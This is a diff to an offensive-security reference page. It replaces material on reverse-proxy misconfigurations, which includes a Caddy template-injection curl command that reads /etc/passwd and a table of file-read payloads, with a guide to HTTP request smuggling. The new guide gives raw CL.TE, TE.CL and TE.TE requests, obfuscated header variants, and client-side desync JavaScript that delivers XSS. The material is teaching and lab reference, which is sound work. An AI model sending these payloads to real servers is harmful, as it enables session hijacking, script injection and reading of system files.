@@ -1,165 +1,181 @@
-# Reverse Proxy Misconfigurations
+# Request Smuggling
 
-> A reverse proxy is a server that sits between clients and backend servers, forwarding client requests to the appropriate server while hiding the backend infrastructure and often providing load balancing or caching. Misconfigurations in a reverse proxy, such as improper access controls, lack of input sanitization in proxy_pass directives, or trusting client-provided headers like X-Forwarded-For, can lead to vulnerabilities like unauthorized access, directory traversal, or exposure of internal resources.
+> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.
 
 ## Summary
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [HTTP Headers](#http-headers)
-        * [X-Forwarded-For](#x-forwarded-for)
-        * [X-Real-IP](#x-real-ip)
-        * [True-Client-IP](#true-client-ip)
-    * [Nginx](#nginx)
-        * [Off By Slash](#off-by-slash)
-        * [Missing Root Location](#missing-root-location)
-    * [Caddy](#caddy)
-        * [Template Injection](#template-injection)
+    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
+    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
+    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
+    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
+    * [Client-Side Desync](#client-side-desync)
 * [Labs](#labs)
 * [References](#references)
 
 ## Tools
 
-* [yandex/gixy](https://github.com/yandex/gixy) - Nginx configuration static analyzer.
-* [MegaManSec/Gixy-Next](https://github.com/MegaManSec/Gixy-Next) - Actively maintained Python3 fork of gixy.
-* [shiblisec/Kyubi](https://github.com/shiblisec/Kyubi) - A tool to discover Nginx alias traversal misconfiguration.
-* [laluka/bypass-url-parser](https://github.com/laluka/bypass-url-parser) - Tool that tests MANY url bypasses to reach a 40X protected page.
-
-    ```ps1
-    bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
-    bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
-    bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
-    ```
+* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
+* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
+* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.
 
 ## Methodology
 
-### HTTP Headers
+If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.
 
-Since headers like `X-Forwarded-For`, `X-Real-IP`, and `True-Client-IP` are just regular HTTP headers, a client can set or override them if it can control part of the traffic path—especially when directly connecting to the application server, or when reverse proxies are not properly filtering or validating these headers.
+### CL.TE Vulnerabilities
 
-#### X-Forwarded-For
+> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
 
-`X-Forwarded-For` is an HTTP header used to identify the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.
+```powershell
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
 
-When a client makes a request through a proxy or load balancer, that proxy adds an X-Forwarded-For header containing the client’s real IP address.
+0
 
-If there are multiple proxies (a request passes through several), each proxy adds the address from which it received the request to the header, comma-separated.
-
-```ps1
-X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
+SMUGGLED
 ```
 
-Nginx can override the header with the client's real IP address.
+Example:
 
-```ps1
-proxy_set_header X-Forwarded-For $remote_addr;
+```powershell
+POST / HTTP/1.1
+Host: domain.example.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
 ```
 
-#### X-Real-IP
+### TE.CL Vulnerabilities
 
-`X-Real-IP` is another custom HTTP header, commonly used by Nginx and some other proxies, to forward the original client IP address. Rather than including a chain of IP addresses like X-Forwarded-For, X-Real-IP contains only a single IP: the address of the client connecting to the first proxy.
+> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
 
-#### True-Client-IP
+```powershell
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
 
-`True-Client-IP` is a header developed and standardized by some providers, particularly by Akamai, to pass the original client’s IP address through their infrastructure.
-
-### Nginx
-
-#### Off By Slash
-
-Nginx matches incoming request URIs against the location blocks defined in your configuration.
-
-* `location /app/` matches requests to `/app/`, `/app/foo`, `/app/bar/123`, etc.
-* `location /app` (no trailing slash) matches `/app*` (i.e., `/application`, `/appfile`, etc.),
-
-This means in Nginx, the presence or absence of a slash in a location block changes the matching logic.
-
-```ps1
-server {
-  location /app/ {
-    # Handles /app/ and anything below, e.g., /app/foo
-  }
-  location /app {
-    # Handles only /app with nothing after OR routes like /application, /appzzz
-  }
-}
+8
+SMUGGLED
+0
 ```
 
-Example of a vulnerable configuration: An attacker requesting `/styles../secret.txt` resolves to `/path/styles/../secret.txt`
+Example:
 
-```ps1
-location /styles {
-  alias /path/css/;
-}
+```powershell
+POST / HTTP/1.1
+Host: domain.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
+Content-Length: 4
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0
+
+
 ```
 
-#### Missing Root Location
+:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.
 
-The `root /etc/nginx;` directive sets the server's root directory for static files.
-The configuration doesn't have a root location `/`, it will be set globally set.
-A request to `/nginx.conf` would resolve to `/etc/nginx/nginx.conf`.
+### TE.TE Vulnerabilities
 
-```ps1
-server {
-  root /etc/nginx;
+> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
 
-  location /hello.txt {
-    try_files $uri $uri/ =404;
-    proxy_pass http://127.0.0.1:8080/;
-  }
-}
+```powershell
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
 ```
 
-### Caddy
+## HTTP/2 Request Smuggling
 
-#### Template Injection
-
-The provided Caddy web server config uses the `templates` directive, which allows dynamic content rendering with Go templates.
+HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header
 
 ```ps1
-:80 {
-    root * /
-    templates
-    respond "You came from {http.request.header.Referer}"
-}
+:method GET
+:path /
+:authority www.example.com
+header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
 ```
 
-This tells Caddy to process the response string as a template, and interpolate any variables (using Go template syntax) present in the referenced request header.
+## Client-Side Desync
 
-In this curl request, the attacker supplied as `Referer` header a Go template expression: `{{readFile "etc/passwd"}}`.
+On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:
 
 ```ps1
-curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
+POST / HTTP/1.1
+Host: www.example.com
+Content-Length: 37
+
+GET / HTTP/1.1
+Host: www.example.com
 ```
 
-```ps1
-HTTP/1.1 200 OK
-Content-Length: 716
-Content-Type: text/plain; charset=utf-8
-Server: Caddy
-Date: Thu, 24 Jul 2025 08:00:50 GMT
+could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.
 
-You came from root:x:0:0:root:/root:/bin/sh
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
+To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:
+
+```javascript
+fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
 ```
 
-Because Caddy is running the templates directive, it will evaluate anything in curly braces inside the context, including things from untrusted input. The `readFile` function is available in Caddy templates, so the attacker's input causes Caddy to actually read `/etc/passwd` and insert its content into the HTTP response.
+This could be used to:
 
-| Payload                       | Description                   |
-| ----------------------------- | ----------------------------- |
-| `{{env "VAR_NAME"}}`          | Get an environment variable   |
-| `{{listFiles "/"}}`           | List all files in a directory |
-| `{{readFile "path/to/file"}}` | Read a file                   |
+* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
+* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
+* to get the victim to run arbitrary JavaScript as if it were from the site
+
+**Example**:
+
+```javascript
+fetch('https://www.example.com/redirect', {
+    method: 'POST',
+        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
+        credentials: 'include',
+        mode: 'cors' // throw an error instead of following redirect
+}).catch(() => {
+        location = 'https://www.example.com/'
+})
+```
+
+This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.
+
+`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.
+Since the browser only sent one request, it accepts the response to the `HEAD` request as the response to its `GET` request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.
 
 ## Labs
 
-* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
-* [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
-* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
-* [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)
+* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
+* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
+* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
 
 ## References
 
-* [What is X-Forwarded-For and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://web.archive.org/web/20260112224231/https://httptoolkit.com/blog/what-is-x-forwarded-for/)
-* [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://web.archive.org/web/20260227155031/https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
+* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://web.archive.org/web/20260111201639/https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
+* [Advanced Request Smuggling - PortSwigger - October 26, 2021](https://web.archive.org/web/20260228102047/https://portswigger.net/web-security/request-smuggling/advanced)
+* [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle (@albinowax) - August 10, 2022](https://web.archive.org/web/20220810190719/https://portswigger.net/research/browser-powered-desync-attacks)
+* [HTTP Desync Attacks: Request Smuggling Reborn - James Kettle (@albinowax) - August 7, 2019](https://web.archive.org/web/20260228152820/https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+* [Request Smuggling Tutorial - PortSwigger - September 28, 2019](https://web.archive.org/web/20190821011451/https://portswigger.net/web-security/request-smuggling)
